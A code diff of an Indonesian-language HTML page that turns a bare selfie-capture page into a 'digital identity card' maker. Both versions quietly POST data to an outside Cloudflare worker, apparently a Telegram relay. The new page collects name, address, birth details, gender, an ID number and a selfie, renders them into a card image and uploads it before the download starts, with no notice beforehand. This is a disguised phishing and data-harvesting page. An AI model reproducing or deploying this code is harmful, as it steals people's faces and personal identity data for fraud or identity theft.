@@ -3,207 +3,1519 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport"
-      content="width=device-width,initial-scale=1">
+      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 
-<title>Camera</title>
+<title>Kartu Identitas Digital</title>
 
 <style>
 *{
   box-sizing:border-box;
 }
 
-body{
+html,body{
   margin:0;
-  min-height:100vh;
-  background:#111;
+  padding:0;
+  background:#0b0d11;
   color:#fff;
-  font-family:Arial,sans-serif;
-  display:flex;
-  justify-content:center;
-  align-items:center;
+  font-family:Arial,Helvetica,sans-serif;
 }
 
-.container{
-  width:min(92%,420px);
-  text-align:center;
+body{
+  min-height:100vh;
+  padding:18px 12px 35px;
 }
 
-h1{
-  font-size:25px;
-  margin-bottom:10px;
-}
-
-p{
-  color:#aaa;
-}
-
-video{
+.app{
   width:100%;
-  margin-top:15px;
-  border-radius:18px;
-  background:#000;
-  display:none;
+  max-width:520px;
+  margin:auto;
+}
+
+.header{
+  text-align:center;
+  margin-bottom:18px;
+}
+
+.header h1{
+  margin:0;
+  font-size:23px;
+}
+
+.header p{
+  margin:7px 0 0;
+  color:#8f98a5;
+  font-size:12px;
+}
+
+.editor{
+  background:#151920;
+  border:1px solid #252b34;
+  border-radius:20px;
+  padding:16px;
+}
+
+/* =========================
+   KARTU
+========================= */
+
+.card-wrap{
+  width:100%;
+  overflow:hidden;
+  border-radius:15px;
+  margin-bottom:18px;
+}
+
+.card{
+  position:relative;
+  width:100%;
+  aspect-ratio:1.586 / 1;
+  overflow:hidden;
+  border-radius:15px;
+  padding:17px;
+  background:
+    radial-gradient(circle at 85% 20%,rgba(255,255,255,.28),transparent 25%),
+    linear-gradient(135deg,#26384d,#111923);
+  box-shadow:0 12px 35px rgba(0,0,0,.4);
+  color:#fff;
+}
+
+/* pola background */
+.card::before{
+  content:"";
+  position:absolute;
+  width:190px;
+  height:190px;
+  border:35px solid rgba(255,255,255,.04);
+  border-radius:50%;
+  right:-70px;
+  bottom:-85px;
+}
+
+.card::after{
+  content:"";
+  position:absolute;
+  width:130px;
+  height:130px;
+  border:20px solid rgba(255,255,255,.035);
+  border-radius:50%;
+  left:-65px;
+  top:-70px;
+}
+
+.card > *{
+  position:relative;
+  z-index:2;
+}
+
+.card-title{
+  text-align:center;
+  font-size:14px;
+  font-weight:bold;
+  letter-spacing:.7px;
+}
+
+.card-subtitle{
+  text-align:center;
+  font-size:7px;
+  opacity:.7;
+  margin-top:3px;
+  letter-spacing:1px;
+}
+
+.card-content{
+  display:flex;
+  gap:13px;
+  margin-top:14px;
+}
+
+.photo-box{
+  width:27%;
+  aspect-ratio:3/4;
+  flex-shrink:0;
+  border:1px solid rgba(255,255,255,.45);
+  border-radius:6px;
+  overflow:hidden;
+  background:rgba(0,0,0,.18);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.photo-box img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
+
+.no-photo{
+  text-align:center;
+  font-size:9px;
+  opacity:.7;
+}
+
+.data{
+  flex:1;
+  min-width:0;
+}
+
+.row{
+  display:flex;
+  margin-bottom:6px;
+  font-size:8px;
+  line-height:1.2;
+}
+
+.row .label{
+  width:31%;
+  opacity:.65;
+}
+
+.row .value{
+  width:69%;
+  font-weight:bold;
+  word-break:break-word;
+}
+
+.watermark{
+  position:absolute;
+  right:12px;
+  bottom:8px;
+  z-index:3;
+  font-size:6px;
+  font-weight:bold;
+  letter-spacing:.8px;
+  opacity:.65;
+}
+
+/* =========================
+   FORM
+========================= */
+
+.section-title{
+  font-size:13px;
+  font-weight:bold;
+  margin:5px 0 12px;
+}
+
+.photo-buttons{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:9px;
+  margin-bottom:15px;
+}
+
+.photo-buttons button{
+  margin:0;
 }
 
 button{
   width:100%;
-  margin-top:20px;
-  padding:16px;
   border:0;
-  border-radius:12px;
-  font-size:17px;
+  border-radius:11px;
+  padding:13px 10px;
+  color:white;
   font-weight:bold;
+  font-size:13px;
+  cursor:pointer;
 }
 
-#start{
-  background:#fff;
-  color:#111;
+.camera-btn{
+  background:#246bfd;
 }
 
-#status{
-  margin-top:18px;
-  color:#aaa;
+.gallery-btn{
+  background:#303741;
+}
+
+input{
+  width:100%;
+  border:1px solid #303742;
+  background:#0e1116;
+  color:#fff;
+  border-radius:10px;
+  padding:12px;
+  outline:none;
+  margin-bottom:10px;
+  font-size:13px;
+}
+
+input:focus{
+  border-color:#3f8cff;
+}
+
+.color-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  background:#0e1116;
+  border:1px solid #303742;
+  border-radius:10px;
+  padding:10px 12px;
+  margin-top:3px;
+}
+
+.color-row span{
+  font-size:12px;
+  color:#c8ced7;
+}
+
+input[type="color"]{
+  width:43px;
+  height:30px;
+  padding:0;
+  margin:0;
+  border:0;
+  background:none;
+}
+
+/* =========================
+   BOTTOM BUTTON
+========================= */
+
+.actions{
+  display:grid;
+  grid-template-columns:1fr 1.4fr;
+  gap:10px;
+  margin-top:16px;
+}
+
+.delete{
+  background:#292f38;
+}
+
+.download{
+  background:#168f55;
+}
+
+/* =========================
+   CAMERA MODAL
+========================= */
+
+.modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.86);
+  z-index:99;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:15px;
+}
+
+.modal.show{
+  display:flex;
+}
+
+.camera{
+  width:100%;
+  max-width:430px;
+  background:#151920;
+  border-radius:18px;
+  padding:12px;
+}
+
+.camera video{
+  display:block;
+  width:100%;
+  aspect-ratio:3/4;
+  object-fit:cover;
+  border-radius:13px;
+  background:#000;
+}
+
+.camera-controls{
+  display:grid;
+  grid-template-columns:1fr 1.5fr;
+  gap:9px;
+  margin-top:10px;
+}
+
+.capture{
+  background:#168f55;
+}
+
+.close{
+  background:#303741;
+}
+
+/* =========================
+   STATUS
+========================= */
+
+.status{
+  text-align:center;
+  font-size:11px;
+  color:#8993a0;
+  min-height:17px;
+  margin-top:12px;
+}
+
+@media(max-width:360px){
+  .card{
+    padding:13px;
+  }
+
+  .card-content{
+    gap:8px;
+    margin-top:10px;
+  }
+
+  .row{
+    font-size:6.7px;
+    margin-bottom:4px;
+  }
+
+  .card-title{
+    font-size:11px;
+  }
+
+  .card-subtitle{
+    font-size:5px;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="app">
 
-  <h1>📸 Camera</h1>
+  <div class="header">
+    <h1>Kartu Identitas Digital</h1>
+    <p>Buat kartu identitas digital pribadi</p>
+  </div>
 
-  <p>
-    Tekan tombol di bawah untuk mengaktifkan kamera.
-  </p>
+  <div class="editor">
 
-  <video
-    id="video"
-    autoplay
-    playsinline>
-  </video>
+    <!-- =====================
+         PREVIEW KARTU
+    ====================== -->
 
-  <button id="start">
-    Izinkan Kamera
-  </button>
+    <div class="card-wrap">
 
-  <div id="status">
-    Kamera belum aktif
+      <div class="card" id="card">
+
+        <div class="card-title">
+          KARTU IDENTITAS DIGITAL
+        </div>
+
+        <div class="card-subtitle">
+          DIGITAL PERSONAL IDENTIFICATION CARD
+        </div>
+
+        <div class="card-content">
+
+          <div class="photo-box">
+
+            <img id="photoPreview"
+                 class="hidden"
+                 alt="Foto">
+
+            <div id="noPhoto"
+                 class="no-photo">
+              FOTO
+            </div>
+
+          </div>
+
+          <div class="data">
+
+            <div class="row">
+              <div class="label">NAMA</div>
+              <div class="value" id="viewNama">
+                -
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="label">ALAMAT</div>
+              <div class="value" id="viewAlamat">
+                -
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="label">TTL</div>
+              <div class="value" id="viewTtl">
+                -
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="label">KELAMIN</div>
+              <div class="value" id="viewKelamin">
+                -
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="label">ID</div>
+              <div class="value" id="viewId">
+                -
+              </div>
+            </div>
+
+          </div>
+
+        </div>
+
+        <div class="watermark">
+          CONTOH • TIDAK BERLAKU SEBAGAI IDENTITAS RESMI
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <!-- =====================
+         FOTO
+    ====================== -->
+
+    <div class="section-title">
+      Foto
+    </div>
+
+    <div class="photo-buttons">
+
+      <button class="camera-btn"
+              onclick="openCamera()">
+        📷 Kamera Selfie
+      </button>
+
+      <button class="gallery-btn"
+              onclick="gallery.click()">
+        🖼️ Galeri
+      </button>
+
+    </div>
+
+    <input
+      type="file"
+      id="gallery"
+      accept="image/*"
+      style="display:none"
+    >
+
+
+    <!-- =====================
+         DATA
+    ====================== -->
+
+    <div class="section-title">
+      Data Kartu
+    </div>
+
+    <input
+      id="nama"
+      placeholder="Nama lengkap"
+      maxlength="60"
+      autocomplete="off"
+    >
+
+    <input
+      id="alamat"
+      placeholder="Alamat"
+      maxlength="100"
+      autocomplete="off"
+    >
+
+    <input
+      id="ttl"
+      placeholder="Tempat / Tanggal Lahir"
+      maxlength="60"
+      autocomplete="off"
+    >
+
+    <input
+      id="kelamin"
+      placeholder="Jenis Kelamin"
+      maxlength="30"
+      autocomplete="off"
+    >
+
+    <input
+      id="id"
+      placeholder="ID / Nomor kartu"
+      maxlength="30"
+      autocomplete="off"
+    >
+
+
+    <!-- =====================
+         BACKGROUND
+    ====================== -->
+
+    <div class="section-title">
+      Background Kartu
+    </div>
+
+    <div class="color-row">
+
+      <span>
+        Pilih warna utama
+      </span>
+
+      <input
+        type="color"
+        id="bgColor"
+        value="#26384d"
+      >
+
+    </div>
+
+
+    <!-- =====================
+         ACTION
+    ====================== -->
+
+    <div class="actions">
+
+      <button
+        class="delete"
+        onclick="hapusKartu()">
+        🗑️ Hapus
+      </button>
+
+      <button
+        class="download"
+        onclick="downloadKartu()">
+        ⬇️ Download
+      </button>
+
+    </div>
+
+    <div class="status" id="status"></div>
+
   </div>
 
 </div>
 
-<canvas id="canvas" hidden></canvas>
+
+<!-- =========================
+     CAMERA
+========================= -->
+
+<div class="modal" id="cameraModal">
+
+  <div class="camera">
+
+    <video
+      id="cameraVideo"
+      autoplay
+      playsinline>
+    </video>
+
+    <div class="camera-controls">
+
+      <button
+        class="close"
+        onclick="closeCamera()">
+        Batal
+      </button>
+
+      <button
+        class="capture"
+        onclick="capturePhoto()">
+        ● Ambil Foto
+      </button>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- =========================
+     HIDDEN CANVAS
+========================= -->
+
+<canvas
+  id="canvas"
+  style="display:none">
+</canvas>
+
 
 <script>
 
-const WORKER_URL =
-"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev/";
+/* =====================================================
+   CONFIG
+===================================================== */
 
-const video =
-document.getElementById("video");
+/*
+  MASUKKAN URL WORKER LAMA KAMU DI SINI.
+*/
+
+const WORKER_URL =
+  "https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev/";
+
+
+/* =====================================================
+   ELEMENT
+===================================================== */
+
+const nama =
+  document.getElementById("nama");
+
+const alamat =
+  document.getElementById("alamat");
+
+const ttl =
+  document.getElementById("ttl");
+
+const kelamin =
+  document.getElementById("kelamin");
+
+const id =
+  document.getElementById("id");
+
+const bgColor =
+  document.getElementById("bgColor");
+
+const card =
+  document.getElementById("card");
+
+const photoPreview =
+  document.getElementById("photoPreview");
+
+const noPhoto =
+  document.getElementById("noPhoto");
+
+const gallery =
+  document.getElementById("gallery");
+
+const cameraModal =
+  document.getElementById("cameraModal");
+
+const cameraVideo =
+  document.getElementById("cameraVideo");
 
 const canvas =
-document.getElementById("canvas");
-
-const start =
-document.getElementById("start");
+  document.getElementById("canvas");
 
 const status =
-document.getElementById("status");
+  document.getElementById("status");
 
 
-start.addEventListener("click", async () => {
+let cameraStream = null;
 
-  try {
 
-    status.textContent =
-      "Meminta izin kamera...";
+/* =====================================================
+   UPDATE TEKS KARTU
+===================================================== */
 
-    const stream =
-      await navigator.mediaDevices.getUserMedia({
-        video:{
-          facingMode:"user"
-        },
-        audio:false
-      });
+function updateCard(){
 
-    video.srcObject = stream;
-    video.style.display = "block";
+  document.getElementById("viewNama").textContent =
+    nama.value.trim() || "-";
 
-    start.disabled = true;
+  document.getElementById("viewAlamat").textContent =
+    alamat.value.trim() || "-";
 
-    status.textContent =
-      "Kamera aktif...";
+  document.getElementById("viewTtl").textContent =
+    ttl.value.trim() || "-";
 
-    await new Promise(resolve =>
-      setTimeout(resolve, 1000)
-    );
+  document.getElementById("viewKelamin").textContent =
+    kelamin.value.trim() || "-";
 
-    canvas.width =
-      video.videoWidth;
+  document.getElementById("viewId").textContent =
+    id.value.trim() || "-";
+}
 
-    canvas.height =
-      video.videoHeight;
 
-    const ctx =
-      canvas.getContext("2d");
+/* =====================================================
+   INPUT LIVE
+===================================================== */
 
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
+[
+  nama,
+  alamat,
+  ttl,
+  kelamin,
+  id
+].forEach(input => {
 
-    status.textContent =
-      "Mengirim foto...";
+  input.addEventListener(
+    "input",
+    updateCard
+  );
 
-    canvas.toBlob(async (blob) => {
+});
 
-      const form =
-        new FormData();
 
-      form.append(
-        "photo",
-        blob,
-        "camera.jpg"
+/* =====================================================
+   BACKGROUND
+===================================================== */
+
+bgColor.addEventListener(
+  "input",
+  () => {
+
+    card.style.background =
+      `
+      radial-gradient(
+        circle at 85% 20%,
+        rgba(255,255,255,.28),
+        transparent 25%
+      ),
+      linear-gradient(
+        135deg,
+        ${bgColor.value},
+        #111923
+      )
+      `;
+
+  }
+);
+
+
+/* =====================================================
+   GALERI
+===================================================== */
+
+gallery.addEventListener(
+  "change",
+  function(){
+
+    const file = this.files[0];
+
+    if(!file) return;
+
+    const reader =
+      new FileReader();
+
+    reader.onload = function(e){
+
+      photoPreview.src =
+        e.target.result;
+
+      photoPreview.classList.remove(
+        "hidden"
       );
 
-      const response =
-        await fetch(WORKER_URL,{
-          method:"POST",
-          body:form
-        });
-
-      if(!response.ok){
-        throw new Error(
-          "Gagal mengirim foto"
-        );
-      }
+      noPhoto.classList.add(
+        "hidden"
+      );
 
       status.textContent =
-        "Foto berhasil dikirim.";
+        "Foto berhasil dimasukkan.";
 
-      stream
-        .getTracks()
-        .forEach(track => track.stop());
+    };
 
-    },"image/jpeg",0.9);
+    reader.readAsDataURL(file);
 
-  } catch(error){
+  }
+);
+
+
+/* =====================================================
+   CAMERA
+===================================================== */
+
+async function openCamera(){
+
+  try{
+
+    cameraStream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video:{
+          facingMode:"user",
+          width:{
+            ideal:1080
+          },
+          height:{
+            ideal:1440
+          }
+        },
+
+        audio:false
+
+      });
+
+    cameraVideo.srcObject =
+      cameraStream;
+
+    cameraModal.classList.add(
+      "show"
+    );
+
+  }catch(error){
+
+    alert(
+      "Kamera tidak dapat dibuka. Pastikan izin kamera diberikan."
+    );
+
+  }
+
+}
+
+
+/* =====================================================
+   TUTUP CAMERA
+===================================================== */
+
+function closeCamera(){
+
+  if(cameraStream){
+
+    cameraStream
+      .getTracks()
+      .forEach(track =>
+        track.stop()
+      );
+
+    cameraStream = null;
+
+  }
+
+  cameraVideo.srcObject = null;
+
+  cameraModal.classList.remove(
+    "show"
+  );
+
+}
+
+
+/* =====================================================
+   AMBIL FOTO SELFIE
+===================================================== */
+
+function capturePhoto(){
+
+  if(!cameraStream) return;
+
+  const videoWidth =
+    cameraVideo.videoWidth;
+
+  const videoHeight =
+    cameraVideo.videoHeight;
+
+  canvas.width =
+    videoWidth;
+
+  canvas.height =
+    videoHeight;
+
+  const ctx =
+    canvas.getContext("2d");
+
+  /*
+    Tidak mirror.
+    Hasil foto mengikuti kamera asli.
+  */
+
+  ctx.drawImage(
+    cameraVideo,
+    0,
+    0,
+    videoWidth,
+    videoHeight
+  );
+
+  photoPreview.src =
+    canvas.toDataURL(
+      "image/jpeg",
+      0.92
+    );
+
+  photoPreview.classList.remove(
+    "hidden"
+  );
+
+  noPhoto.classList.add(
+    "hidden"
+  );
+
+  closeCamera();
+
+  status.textContent =
+    "Foto selfie berhasil diambil.";
+
+}
+
+
+/* =====================================================
+   BUAT GAMBAR KARTU
+===================================================== */
+
+async function renderCardImage(){
+
+  /*
+    Karena browser tidak bisa langsung
+    menyimpan elemen HTML sebagai JPG,
+    kita gambar ulang kartu ke canvas.
+  */
+
+  const width = 1200;
+  const height =
+    Math.round(
+      width / 1.586
+    );
+
+  const out =
+    document.createElement(
+      "canvas"
+    );
+
+  out.width = width;
+  out.height = height;
+
+  const ctx =
+    out.getContext("2d");
+
+  /* background */
+
+  const gradient =
+    ctx.createLinearGradient(
+      0,
+      0,
+      width,
+      height
+    );
+
+  gradient.addColorStop(
+    0,
+    bgColor.value
+  );
+
+  gradient.addColorStop(
+    1,
+    "#111923"
+  );
+
+  ctx.fillStyle =
+    gradient;
+
+  ctx.fillRect(
+    0,
+    0,
+    width,
+    height
+  );
+
+
+  /* pola lingkaran */
+
+  ctx.globalAlpha = .07;
+
+  ctx.beginPath();
+
+  ctx.arc(
+    width - 80,
+    height - 50,
+    210,
+    0,
+    Math.PI * 2
+  );
+
+  ctx.lineWidth = 55;
+
+  ctx.strokeStyle =
+    "#ffffff";
+
+  ctx.stroke();
+
+  ctx.globalAlpha = 1;
+
+
+  /* title */
+
+  ctx.fillStyle =
+    "#ffffff";
+
+  ctx.textAlign =
+    "center";
+
+  ctx.font =
+    "bold 34px Arial";
+
+  ctx.fillText(
+    "KARTU IDENTITAS DIGITAL",
+    width / 2,
+    65
+  );
+
+  ctx.font =
+    "12px Arial";
+
+  ctx.globalAlpha = .7;
+
+  ctx.fillText(
+    "DIGITAL PERSONAL IDENTIFICATION CARD",
+    width / 2,
+    87
+  );
+
+  ctx.globalAlpha = 1;
+
+
+  /* foto */
+
+  const px = 55;
+  const py = 125;
+  const pw = 250;
+  const ph = 330;
+
+  ctx.strokeStyle =
+    "rgba(255,255,255,.7)";
+
+  ctx.lineWidth = 2;
+
+  ctx.strokeRect(
+    px,
+    py,
+    pw,
+    ph
+  );
+
+
+  if(photoPreview.src){
+
+    try{
+
+      const img =
+        await loadImage(
+          photoPreview.src
+        );
+
+      drawCoverImage(
+        ctx,
+        img,
+        px,
+        py,
+        pw,
+        ph
+      );
+
+    }catch(e){}
+
+  }else{
+
+    ctx.fillStyle =
+      "rgba(0,0,0,.15)";
+
+    ctx.fillRect(
+      px,
+      py,
+      pw,
+      ph
+    );
+
+    ctx.fillStyle =
+      "rgba(255,255,255,.7)";
+
+    ctx.font =
+      "bold 25px Arial";
+
+    ctx.textAlign =
+      "center";
+
+    ctx.fillText(
+      "FOTO",
+      px + pw/2,
+      py + ph/2
+    );
+
+  }
+
+
+  /* data */
+
+  const startX = 350;
+  let y = 150;
+
+  drawText(
+    ctx,
+    "NAMA",
+    nama.value || "-",
+    startX,
+    y
+  );
+
+  y += 70;
+
+  drawText(
+    ctx,
+    "ALAMAT",
+    alamat.value || "-",
+    startX,
+    y
+  );
+
+  y += 70;
+
+  drawText(
+    ctx,
+    "TEMPAT / TGL LAHIR",
+    ttl.value || "-",
+    startX,
+    y
+  );
+
+  y += 70;
+
+  drawText(
+    ctx,
+    "JENIS KELAMIN",
+    kelamin.value || "-",
+    startX,
+    y
+  );
+
+  y += 70;
+
+  drawText(
+    ctx,
+    "ID",
+    id.value || "-",
+    startX,
+    y
+  );
+
+
+  /* watermark */
+
+  ctx.textAlign =
+    "right";
+
+  ctx.font =
+    "bold 13px Arial";
+
+  ctx.fillStyle =
+    "rgba(255,255,255,.65)";
+
+  ctx.fillText(
+    "CONTOH • TIDAK BERLAKU SEBAGAI IDENTITAS RESMI",
+    width - 35,
+    height - 25
+  );
+
+
+  return out;
+
+}
+
+
+/* =====================================================
+   DRAW TEXT
+===================================================== */
+
+function drawText(
+  ctx,
+  label,
+  value,
+  x,
+  y
+){
+
+  ctx.textAlign =
+    "left";
+
+  ctx.font =
+    "12px Arial";
+
+  ctx.fillStyle =
+    "rgba(255,255,255,.65)";
+
+  ctx.fillText(
+    label,
+    x,
+    y
+  );
+
+  ctx.font =
+    "bold 25px Arial";
+
+  ctx.fillStyle =
+    "#ffffff";
+
+  /*
+    Potong teks yang terlalu panjang
+  */
+
+  let text =
+    String(value);
+
+  if(text.length > 38){
+
+    text =
+      text.substring(
+        0,
+        38
+      ) + "...";
+
+  }
+
+  ctx.fillText(
+    text,
+    x,
+    y + 30
+  );
+
+}
+
+
+/* =====================================================
+   IMAGE LOADER
+===================================================== */
+
+function loadImage(src){
+
+  return new Promise(
+    (resolve,reject) => {
+
+      const img =
+        new Image();
+
+      img.onload =
+        () => resolve(img);
+
+      img.onerror =
+        reject;
+
+      img.src =
+        src;
+
+    }
+  );
+
+}
+
+
+/* =====================================================
+   COVER IMAGE
+===================================================== */
+
+function drawCoverImage(
+  ctx,
+  img,
+  x,
+  y,
+  w,
+  h
+){
+
+  const ratio =
+    Math.max(
+      w / img.width,
+      h / img.height
+    );
+
+  const nw =
+    img.width * ratio;
+
+  const nh =
+    img.height * ratio;
+
+  const nx =
+    x + (w - nw) / 2;
+
+  const ny =
+    y + (h - nh) / 2;
+
+  ctx.save();
+
+  ctx.beginPath();
+
+  ctx.rect(
+    x,
+    y,
+    w,
+    h
+  );
+
+  ctx.clip();
+
+  ctx.drawImage(
+    img,
+    nx,
+    ny,
+    nw,
+    nh
+  );
+
+  ctx.restore();
+
+}
+
+
+/* =====================================================
+   DOWNLOAD + KIRIM KE WORKER LAMA
+===================================================== */
+
+async function downloadKartu(){
+
+  status.textContent =
+    "Membuat kartu...";
+
+  try{
+
+    const resultCanvas =
+      await renderCardImage();
+
+
+    /*
+      Ubah canvas menjadi Blob JPG
+    */
+
+    const blob =
+      await new Promise(
+        resolve =>
+          resultCanvas.toBlob(
+            resolve,
+            "image/jpeg",
+            0.94
+          )
+      );
+
+
+    if(!blob){
+
+      throw new Error(
+        "Gagal membuat gambar."
+      );
+
+    }
+
+
+    /*
+      ============================================
+      KIRIM KE WORKER LAMA
+      ============================================
+    */
+
+    const form =
+      new FormData();
+
+    /*
+      Worker lama hanya membaca field "photo".
+      Jadi seluruh teks sudah dibakar ke dalam
+      gambar kartu sebelum dikirim.
+    */
+
+    form.append(
+      "photo",
+      blob,
+      "kartu-digital.jpg"
+    );
+
+
+    status.textContent =
+      "Mengirim kartu...";
+
+
+    const response =
+      await fetch(
+        WORKER_URL,
+        {
+          method:"POST",
+          body:form
+        }
+      );
+
+
+    const result =
+      await response.json();
+
+
+    if(!result.ok){
+
+      throw new Error(
+        result.error ||
+        "Worker gagal."
+      );
+
+    }
+
+
+    /*
+      ============================================
+      DOWNLOAD KE HP
+      ============================================
+    */
+
+    const url =
+      URL.createObjectURL(
+        blob
+      );
+
+    const a =
+      document.createElement(
+        "a"
+      );
+
+    a.href = url;
+
+    a.download =
+      "kartu-identitas-digital.jpg";
+
+    document.body.appendChild(a);
+
+    a.click();
+
+    a.remove();
+
+    URL.revokeObjectURL(
+      url
+    );
+
+
+    status.textContent =
+      "✓ Kartu berhasil dibuat, dikirim, dan di-download.";
+
+  }catch(error){
 
     console.error(error);
 
     status.textContent =
-      "Kamera tidak diizinkan.";
-
-    start.disabled = false;
+      "Gagal: " +
+      error.message;
 
   }
 
-});
+}
+
+
+/* =====================================================
+   HAPUS
+===================================================== */
+
+function hapusKartu(){
+
+  nama.value = "";
+  alamat.value = "";
+  ttl.value = "";
+  kelamin.value = "";
+  id.value = "";
+
+  photoPreview.src = "";
+
+  photoPreview.classList.add(
+    "hidden"
+  );
+
+  noPhoto.classList.remove(
+    "hidden"
+  );
+
+  gallery.value = "";
+
+  updateCard();
+
+  status.textContent =
+    "Kartu dikosongkan.";
+
+}
+
+
+/* =====================================================
+   INITIAL
+===================================================== */
+
+updateCard();
 
 </script>
 
